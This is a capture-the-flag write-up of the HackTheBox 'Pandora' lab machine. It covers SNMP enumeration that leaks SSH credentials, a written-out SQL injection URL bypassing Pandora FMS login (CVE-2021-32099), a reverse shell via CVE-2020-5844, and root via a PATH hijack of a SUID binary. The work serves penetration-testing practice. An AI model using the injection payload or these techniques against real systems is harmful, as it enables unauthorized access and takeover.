---
title: "HackTheBox Pandora Write-Up"
date: 2022-05-21
slug: hackthebox-pandora-write-up
excerpt: "A full walkthrough of the Pandora machine (easy) on HackTheBox: SNMP enumeration, a Pandora FMS SQLi and RCE, and a PATH-hijack SUID binary for root."
source: https://medium.com/@NicPWNs/hackthebox-pandora-write-up-9c1d409c69dd?source=rss-57a2a039424d------2
tags: ["hackthebox"]
---

[![HackTheBox profile badge](https://www.hackthebox.com/badge/image/72382)](https://app.hackthebox.com/users/72382)

This is my write-up for the Pandora machine on HackTheBox that just retired! Here I detail the penetration testing steps taken to scan, exploit, and privilege escalate on this target machine. This machine is categorized as *easy* difficulty and was retired on May 21, 2022.

## Pandora Summary

![HackTheBox Pandora machine avatar](/writeups/hackthebox-pandora-write-up/img-1.png)

### Target Information

[**Machine Page**](https://app.hackthebox.com/machines/pandora)  
**IP Address:** 10.10.11.136  
**Hostname:** pandora.htb

### Synopsis

Open SNMP with a default community string allows for enumeration which reveals SSH credentials. SSH access reveals an internal web site which can be accessed via an SSH tunnel. The Pandora FMS web application running on the internal site is vulnerable to a SQL injection vulnerability that allows for authentication bypass. The Pandora FMS web application is also vulnerable to remote code execution once authenticated which allows for a reverse shell on the target. A SUID binary does not reference the full executable path of a dependency so poisoning the path leads to privilege escalation.

## Scanning

### Nmap (TCP)

The Nmap scan shows that there is an Apache httpd server on port 80/tcp and SSH open on port 22/tcp.

```bash
# nmap -sV -sC -p- 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 23:18 GMT
Nmap scan report for 10.10.11.136
Host is up (0.050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.34 seconds
```

### Nikto/Gobuster

Nikto and Gobuster do not give us much useful information about the target website. So I do not include their results here.

### HTTP

There is a basic site on port 80/tcp. There is not much interesting to note about it. A dead end.

![Site running on port 80/tcp.](/writeups/hackthebox-pandora-write-up/img-2.png)

*Site running on port 80/tcp.*

### Nmap (UDP)

With no leads on any of the ports and services, it’s worth running a slow UDP scan with Nmap. SNMP is found to be open on port 161/udp.

```bash
# nmap -sU 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 23:07 GMT
Nmap scan report for 10.10.11.136
Host is up (0.053s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
Nmap done: 1 IP address (1 host up) scanned in 1058.34 seconds
```

### SNMPWalk

SNMPWalk is a tool on Kali that can be used to scan the SNMP protocol. It requires a community string which usually is default as “public” for SNMP. The “public” community string is correct and SNMPwalk is able to print tons of information from SNMP on the target. Including a username and password of daniel:HotelBabylon23.

```bash
# snmpwalk -v 1 -c public 10.10.11.136
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (128906) 0:21:29.06
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (7) 0:00:00.07
---- SNIP ----
iso.3.6.1.2.1.25.4.2.1.5.839 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.1118 = STRING: "-u daniel -p HotelBabylon23"
```

## Exploit

### SSH Access

There were no login pages identified on the web server on port 80/tcp or anywhere else. The only place to try the credentials dumped from SNMP is SSH on port 22/tcp. The credentials work for SSH!

![Successful SSH login with found credentials.](/writeups/hackthebox-pandora-write-up/img-3.png)

*Successful SSH login with found credentials.*

### Alternate Web Server

This daniel user isn't yet the user that gives us the user.txt flag, so there's still more to do before privilege escalation. After looking around, the Apache httpd directory /var/www and the /etc/hosts file indicate that there is an alternate website running something called Pandora.

![/var/www and /etc/hosts suggesting other web server.](/writeups/hackthebox-pandora-write-up/img-4.png)

*/var/www and /etc/hosts suggesting other web server.*

### Tunnels and Proxies

In order to access the new web site on the target machine with our host’s web browser and tools, we must first establish a tunnel to the target machine, and then proxy any web browsers and tools to that established tunnel. A tunnel can be quickly set up using the SSH access we have. In a new SSH session, simply adding -D 80 creates a dynamic tunnel to port 80/tcp on our localhost.

```bash
# sudo ssh -D 80 daniel@10.10.11.136
```

Now, with the tunnel set up to port 80/tcp on our localhost, we must instruct our browser to proxy to that tunnel. This can be done in the browser directly or through an easy to use tool like [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/).

![Using FoxyProxy to set up the SOCKS5 proxy to the localhost tunnel on port 80/tcp.](/writeups/hackthebox-pandora-write-up/img-5.png)

*Using FoxyProxy to set up the SOCKS5 proxy to the localhost tunnel on port 80/tcp.*

Now we can see the Pandora web site at [http://127.0.0.1/pandora\_console/.](http://127.0.0.1/pandora_console/.)

![Landing page for Pandora FMS.](/writeups/hackthebox-pandora-write-up/img-6.png)

*Landing page for Pandora FMS.*

### CVE-2021–32099

After searching around about this software Pandora FMS there is a SQL injection vulnerability registered as CVE-2021–32099 affecting this version v7.0NG.742. I found this [GitHub repo](https://github.com/ibnuuby/CVE-2021-32099) which provides a link to automatically set our PHPSESSID cookie to one that is extracted via the SQL injection vulnerability. The link that we use is below.

```
http://127.0.0.1:80/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

Going to this link sets our PHPSESSID cookie to a valid administrator one. So when we go back to the landing page we are logged in as the admin without needing a username or password.

![Logged in as admin on Pandora FMS.](/writeups/hackthebox-pandora-write-up/img-7.png)

*Logged in as admin on Pandora FMS.*

### CVE-2020–5844

Now, with admin login we still need some form of code execution on the system to move further. Searching again shows there is an authenticated remote code execution vulnerability registered as CVE-2020–5844 affecting this version of Pandora FMS v7.0NG.742. There are a few proof of concept scripts available for exploiting this vulnerability, but I have since created my own [exploit for CVE-2020–5844](https://github.com/UNICORDev/exploit-CVE-2020-5844) under my [UNICORD](https://unicord.dev/) project.

My exploit script can be used in multiple different configurations including web shell, custom command, and reverse shell. For our purposes, we’ll use the reverse shell functionality and provide the PHPSESSID stored in our browser that was stolen earlier. We also must use proxychains in order to route the traffic to the established SSH tunnel. This can be done by adding the line socks5 127.0.0.1 80 to the end of /etc/proxychains.conf. Using the proxychains -q command at the beginning of the exploit command routes the traffic through the proxy.

![Successful exploitation of CVE-2020–5844 for a reverse shell.](/writeups/hackthebox-pandora-write-up/img-8.png)

*Successful exploitation of CVE-2020–5844 for a reverse shell.*

Now, although the reverse shell works pretty good, SSH access is always preferred. We can add an SSH public key to this new user’s configuration to log in with SSH.

![Creating SSH config with correct permissions.](/writeups/hackthebox-pandora-write-up/img-9.png)

*Creating SSH config with correct permissions.*

![Adding SSH public key to authorized_keys for the user Matt.](/writeups/hackthebox-pandora-write-up/img-10.png)

*Adding SSH public key to authorized_keys for the user Matt.*

Matt also has user.txt, so that's one flag down!

## Enumeration

### SUID Binaries

One of the first things I always check when enumerating for privilege escalation is SUID binaries. We can check the entire system for SUID binaries with the command below. There’s one particular SUID binary that stands out at /usr/bin/pandora\_backup.

```bash
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
```

## Root

We can run this binary in the context of the root user, but we need to know what it does in order to exploit it. I copied the compiled binary to my system and ran strings on it. This indicated that the binary was running the tar command but did not explicitly specify to use /usr/bin/tar. This means that the system will automatically search in our PATH for a tar executable. We can edit our PATH, so this means we can create a malicious tar executable and add its location to the beginning of our PATH. This way, pandora\_backup will end up running our fake tar with root privileges rather than the real one. We can create a basic fake tar and edit our PATH to include it like below. Running the SUID binary gives root!

![Creating a malicious tar executable and editing the PATH to achieve root.](/writeups/hackthebox-pandora-write-up/img-11.png)

*Creating a malicious tar executable and editing the PATH to achieve root.*

That’s root! The root.txt flag is then available in /root.

## Loot

Other than the points on HackTheBox, the lessons learned are the real treasures for this box.

1.  Missing Absolute Paths — A script or binary not referencing the absolute path such as /usr/bin/tar for one of its dependencies is an easy mistake and a crucial one in the case of an SUID binary.
2.  Creating Exploits — Creating your own exploits and tools is often a great way to learn a lot about a particular vulnerability while also practicing coding along the way. I do this through my [UNICORD](https://unicord.dev/) project which I will describe further in a future post.

[![HackTheBox profile badge](https://www.hackthebox.com/badge/image/72382)](https://app.hackthebox.com/users/72382)

Found this helpful? Drop some [respect](https://app.hackthebox.com/users/72382) on my HackTheBox profile!

Thank you for reading my write-up for the Pandora machine on HackTheBox. Be sure to check out my other write-ups for [HackTheBox](/notes?tag=hackthebox)!
